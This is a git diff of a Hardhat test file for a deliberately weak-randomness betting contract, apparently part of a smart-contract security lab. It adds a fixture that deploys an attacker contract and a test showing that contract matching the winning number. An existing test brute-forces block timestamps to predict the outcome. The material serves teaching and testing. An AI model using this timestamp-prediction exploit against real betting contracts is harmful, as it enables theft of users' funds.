@@ -18,6 +18,29 @@ describe("Weak Randomess", function () {
     return { weakRandomnessBet, owner, user, attacker };
   }
 
+  async function deployFixtureAttack() {
+    const [owner, user, attacker] = await ethers.getSigners();
+    const WeakRandomnessBet = await ethers.getContractFactory(
+      "WeakRandomnessBet"
+    );
+    const weakRandomnessBet = await WeakRandomnessBet.deploy();
+    await ethers.provider.send("evm_mine");
+    const WeakRandomnessBetAttack = await ethers.getContractFactory(
+      "WeakRandomnessBetAttack",
+      attacker
+    );
+    const weakRandomnessBetAttack = await WeakRandomnessBetAttack.deploy(
+      weakRandomnessBet.target
+    );
+    return {
+      weakRandomnessBet,
+      owner,
+      user,
+      attacker,
+      weakRandomnessBetAttack,
+    };
+  }
+
   it("Deploy should be ok", async function () {
     const { weakRandomnessBet, owner } = await loadFixture(deployFixture);
     expect(await ethers.provider.getBalance(weakRandomnessBet.target)).to.equal(
@@ -103,10 +126,15 @@ describe("Weak Randomess", function () {
 
       let targetTimeStamp = (await ethers.provider.getBlock("latest")).toJSON()
         .timestamp;
-    
+
       while (true) {
         const randomUint = (targetTimeStamp % 100) + 1;
-        console.log("Creating timestamp: " + targetTimeStamp + " Current number: " + randomUint);
+        console.log(
+          "Creating timestamp: " +
+            targetTimeStamp +
+            " Current number: " +
+            randomUint
+        );
         if (randomUint == attackerBet) {
           console.log("Found next TimeStamp: " + targetTimeStamp);
           break;
@@ -131,6 +159,21 @@ describe("Weak Randomess", function () {
       expect(
         await ethers.provider.getBalance(attacker.address)
       ).to.be.greaterThan(attackerBalance);
+    });
+    it("Attack from Smart Contract", async function () {
+
+      const { weakRandomnessBet, user, attacker, weakRandomnessBetAttack } = await deployFixtureAttack();
+      await ethers.provider.send("evm_setAutomine", [false]);
+      await weakRandomnessBetAttack.connect(attacker).attack({ value: ethers.parseEther("10") });
+      await weakRandomnessBet.closeBets();
+      await ethers.provider.send("evm_mine");
+      await ethers.provider.send("evm_mine");
+      const attackerContractAddress = weakRandomnessBetAttack.target;      
+      const attackerNumber = await weakRandomnessBet.getBetOf(attackerContractAddress);
+      const winningNumber = await weakRandomnessBet.getWinningNumber();
+      console.log("Attacker Number: ", attackerNumber);
+      console.log("Winning Number: ", winningNumber);
+      expect(attackerNumber).to.equal(winningNumber);
     });
   });
 });
